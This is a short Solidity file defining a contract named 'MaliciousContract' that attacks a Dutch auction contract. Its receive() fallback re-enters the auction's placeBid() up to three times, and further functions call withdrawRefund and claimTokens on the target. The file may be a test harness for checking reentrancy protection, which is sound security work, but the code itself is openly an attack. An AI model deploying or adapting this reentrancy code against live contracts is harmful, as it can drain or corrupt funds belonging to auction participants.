// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDutchAuction {
    function placeBid() external payable;
    function withdrawRefund(uint256 bidderId) external;
    function claimTokens(uint256 bidderId) external;
    function getBidderID(address bidderAddress) external view returns (uint256); 
}

contract MaliciousContract {
    IDutchAuction public auction;
    uint256 public attackCount;
    
    constructor(address _auctionAddress) {
        auction = IDutchAuction(_auctionAddress);
    }
    
    // Fallback function to execute reentrancy attack
    receive() external payable {
        if (attackCount < 3) {
            attackCount++;
            auction.placeBid{value: msg.value}();
        }
    }
    
    // Malicious attack function that accepts Ether (msg.value)
    function attackPlaceBid() external payable {
        require(msg.value > 0, "No Ether sent");
        auction.placeBid{value: msg.value}();
    }
    
    function attackWithdrawRefund(uint256 bidderId) external {
        auction.withdrawRefund(bidderId);
    }
    
    function attackClaimTokens(uint256 bidderId) external {
        auction.claimTokens(bidderId);
    }

    // Allow contract to receive ETH
    fallback() external payable {}
}